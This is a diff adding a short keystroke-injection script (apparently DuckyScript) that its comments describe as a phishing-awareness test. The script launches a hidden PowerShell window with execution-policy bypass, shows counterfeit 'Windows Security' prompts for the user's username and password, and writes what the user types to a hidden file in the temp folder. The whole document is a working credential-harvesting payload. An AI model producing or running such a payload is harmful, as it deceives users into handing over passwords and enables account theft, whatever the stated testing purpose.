@@ -1,0 +1,17 @@
+REM ============================================================
+REM  Windows · Credential Phishing Popup
+REM ============================================================
+REM  Displays a fake Windows Security dialog asking the user
+REM  to re-enter their credentials. Captured creds are saved
+REM  to a hidden file. Tests phishing awareness.
+REM
+REM  Output: %TEMP%\.cred_test.txt
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN Add-Type -AssemblyName Microsoft.VisualBasic;$u=[Microsoft.VisualBasic.Interaction]::InputBox("Windows Security requires your credentials to continue.`n`nUsername:","Windows Security",$env:USERNAME);if($u){$p=[Microsoft.VisualBasic.Interaction]::InputBox("Enter password for $u :","Windows Security","");if($p){"User: $u`nPass: $p`nTime: $(Get-Date)"|Out-File "$env:TEMP\.cred_test.txt" -Append}};exit
